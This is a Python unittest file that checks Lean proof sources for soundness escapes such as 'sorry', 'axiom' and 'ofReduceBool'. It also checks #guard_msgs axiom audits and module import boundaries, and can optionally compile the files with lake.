    def test_stripper_ignores_comments_and_strings_but_flags_code(self) -> None:
        src = (
            "/- sorry /- nested admit -/ still comment native_decide -/\n"
            "-- axiom in a line comment\n"
            'def s : String := "sorry \\" unsafe"\n'
            "def c : Char := 'x'\n"
            "theorem h' : True := trivial -- partial\n"
            "theorem bad : False := by sorry\n"
            "@[implemented_by foo] def g := 1\n"
            "def r := r#\"extern\"#\n"
            "#print axioms h'\n"
        )
        hits = find_forbidden_lean_tokens(strip_lean_comments_and_strings(src))
        self.assertEqual(hits, [(6, "sorry"), (7, "implemented_by")])
        self.assertEqual(find_forbidden_lean_tokens("axiom foo : False\nunsafe def x := 1\n"), [(1, "axiom"), (2, "unsafe")])
        self.assertEqual(find_forbidden_lean_tokens("example := Lean.ofReduceBool\n"), [(1, "ofReduceBool")])
        self.assertEqual(find_forbidden_lean_tokens("#print axioms foo\ntheorem partialFoo : True := trivial\n"), [])

    def test_name_literals_are_not_uses_but_terms_are(self) -> None:
        audit = "if a == ``sorryAx || a == `Lean.ofReduceBool || a == `Lean.trustCompiler then pure ()\n"
        self.assertEqual(find_forbidden_lean_tokens(strip_lean_name_literals(audit)), [])
        self.assertEqual(find_forbidden_lean_tokens(audit), [(1, "ofReduceBool"), (1, "sorryAx"), (1, "trustCompiler")])
        self.assertEqual(find_forbidden_lean_tokens(strip_lean_name_literals("theorem t : False := sorryAx False true\n")), [(1, "sorryAx")])
        self.assertEqual(find_forbidden_lean_tokens(strip_lean_name_literals("example := Lean.ofReduceBool a b c\n")), [(1, "ofReduceBool")])

    def test_guard_and_self_audit_parsers_accept_clean_and_flag_bad_expectations(self) -> None:
        good = (
            "theorem t : True := trivial\n"
            "/--\ninfo: 'Ns.t' depends on axioms: [propext, Quot.sound]\n-/\n#guard_msgs in\n#print axioms t\n"
            "/-- info: 'Ns.u' does not depend on any axioms -/\n#guard_msgs in\n#print axioms u\n"
        )
        guards, problems = parse_axiom_guards(good)
        self.assertEqual((len(guards), problems), (2, []))
        self.assertEqual(guards[0]["axioms"], ["propext", "Quot.sound"])
        for bad, needle in (
            ("/-- info: 'Ns.t' depends on axioms: [propext, sorryAx] -/\n#guard_msgs in\n#print axioms t\n", "sorryAx"),
            ("/-- info: 'Ns.t' depends on axioms: [Lean.ofReduceBool] -/\n#guard_msgs in\n#print axioms t\n", "Lean.ofReduceBool"),
            ("/-- info: 'Ns.t' depends on axioms: [myAxiom, propext] -/\n#guard_msgs in\n#print axioms t\n", "myAxiom"),
            ("#guard_msgs in\n#print axioms t\n", "no expected-output docstring"),
            ("/-- info: 'Ns.other' does not depend on any axioms -/\n#guard_msgs in\n#print axioms t\n", "guard expects axioms of"),
            ("#print axioms t\n", "not pinned by `#guard_msgs in`"),
            ("/-- info: 'Ns.t' depends on axioms: [propext] -/\n#guard_msgs (drop info) in\n#print axioms t\n", "drops messages"),
        ):
            with self.subTest(needle):
                _, problems = parse_axiom_guards(bad)
                self.assertTrue(any(needle in p for p in problems), problems)
        audit = (
            'elab "#assert_x_axioms" : command => do\n'
            "  let axs ← liftCoreM <| Lean.collectAxioms n\n"
            "  for a in axs do\n"
            "    if a == ``sorryAx || a == `Lean.ofReduceBool || a == `Lean.trustCompiler then\n"
            '      throwError "forbidden"\n'
            "    unless a == ``propext || a == ``Quot.sound || a == ``Classical.choice do\n"
            '      throwError "unexpected"\n'
            "\n#assert_x_axioms\n"
        )
        self.assertEqual(parse_self_axiom_audits(audit), (["#assert_x_axioms"], []))
        for bad, needle in (
            (audit.replace("\n#assert_x_axioms\n", "\n"), "never invoked"),
            (audit.replace("a == `Lean.trustCompiler", "false"), "does not reject Lean.trustCompiler"),
            (audit.replace("``Classical.choice", "``myAxiom"), "admits"),
        ):
            with self.subTest(needle):
                self.assertTrue(any(needle in p for p in parse_self_axiom_audits(bad)[1]), parse_self_axiom_audits(bad))


class LeanHygieneTargetTests(unittest.TestCase):
    """`MoveDeinitEquiv.lean` (Episode 1) and, once Shard 1 lands, the promoted
    `Trusted.Correspondence` / `Anneal.Mir.Correspondence.*` modules."""

    @classmethod
    def setUpClass(cls) -> None:
        cls.targets = lean_hygiene_targets()
        cls.sources = {rel: (REPO_ROOT / rel).read_text(encoding="utf-8") for rel in cls.targets if (REPO_ROOT / rel).is_file()}

    def test_required_targets_present_and_optional_ones_discovered(self) -> None:
        for rel in LEAN_HYGIENE_REQUIRED:
            self.assertIn(rel, self.sources, f"{rel} is missing")
        self.assertEqual(set(self.sources), set(self.targets))
        self.assertNotIn("theory/Anneal/LeanMiriDeinitAndCodecPrototype.lean", self.targets)

    def test_no_forbidden_tokens(self) -> None:
        for rel, src in self.sources.items():
            with self.subTest(rel):
                hits = find_forbidden_lean_tokens(strip_lean_name_literals(strip_lean_comments_and_strings(src)))
                self.assertEqual(hits, [], f"forbidden tokens in {rel}: {hits}")

    def test_imports_respect_the_module_boundaries(self) -> None:
        for rel, src in self.sources.items():
            with self.subTest(rel):
                imports = re.findall(r"^(?:public\s+|private\s+)?(?:meta\s+)?import\s+(?:all\s+)?(\S+)", strip_lean_comments_and_strings(src), re.M)
                self.assertTrue(imports, f"{rel} has no imports")
                roots = {name.split(".", 1)[0] for name in imports}
                self.assertNotIn("Lake", roots, rel)
                if rel.startswith("trusted/lean/"):
                    # The Trusted boundary admits only Init / Std / Trusted (no Lean compiler import).
                    self.assertLessEqual(roots, {"Init", "Std", "Trusted"}, rel)
                if rel == "lean-miri/lean/LeanMiriSpec/Correspondence/MoveDeinitEquiv.lean":
                    self.assertIn("Trusted", roots)
                    self.assertIn("Miri", roots)

    def test_axiom_audits_admit_only_standard_axioms(self) -> None:
        for rel, src in self.sources.items():
            with self.subTest(rel):
                guards, guard_problems = parse_axiom_guards(src)
                audits, audit_problems = parse_self_axiom_audits(src)
                self.assertEqual(guard_problems + audit_problems, [])
                for guard in guards:
                    self.assertFalse({"sorryAx", "Lean.ofReduceBool", "Lean.trustCompiler"} & set(guard["axioms"] or []), guard)
                if rel in LEAN_HYGIENE_REQUIRED:
                    self.assertTrue(guards or audits, f"{rel} carries no axiom audit")
        self.assertEqual(parse_self_axiom_audits(self.sources[LEAN_HYGIENE_REQUIRED[0]])[0], ["#assert_move_deinit_equiv_axioms"])

    def test_compiles_without_errors_warnings_or_sorry(self) -> None:
        if os.environ.get("ANNEAL_PIN_LEAN_COMPILE") != "1":
            self.skipTest("set ANNEAL_PIN_LEAN_COMPILE=1 (needs prebuilt Trusted / Anneal / Miri oleans)")
        home = Path.home()
        env = dict(os.environ)
        env["PATH"] = f"{home / '.elan' / 'bin'}{os.pathsep}{home / '.local' / 'bin'}{os.pathsep}{env.get('PATH', '')}"
        missing = [tool for tool in ("anneal-lean-run", "lake") if shutil.which(tool, path=env["PATH"]) is None]
        if missing:
            self.skipTest(f"missing tools: {missing}")
        cmd = ["anneal-lean-run", "--mode", "file", "--concurrency", "1"]
        if os.environ.get("ANNEAL_PIN_LEAN_RUN_TIMEOUT"):
            cmd += ["--timeout", os.environ["ANNEAL_PIN_LEAN_RUN_TIMEOUT"]]
        for rel in self.sources:
            with self.subTest(rel):
                # `lean-miri/lean` (LeanMiriSpec) and the vendored Miri sources are
                # `examples/lakefile.toml` libraries; the rest belong to the root package.
                cwd, target = (REPO_ROOT / "examples", f"../{rel}") if rel.startswith("lean-miri/") else (REPO_ROOT, rel)
                proc = subprocess.run(
                    cmd + ["--", "lake", "env", "lean", target],
                    cwd=cwd, env=env, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, timeout=3600, check=False,
                )
                output = proc.stdout
                self.assertEqual(proc.returncode, 0, output[-4000:])
                for needle in ("error:", "warning:", "declaration uses 'sorry'"):
                    self.assertNotIn(needle, output, output[-4000:])


if __name__ == "__main__":
    unittest.main()
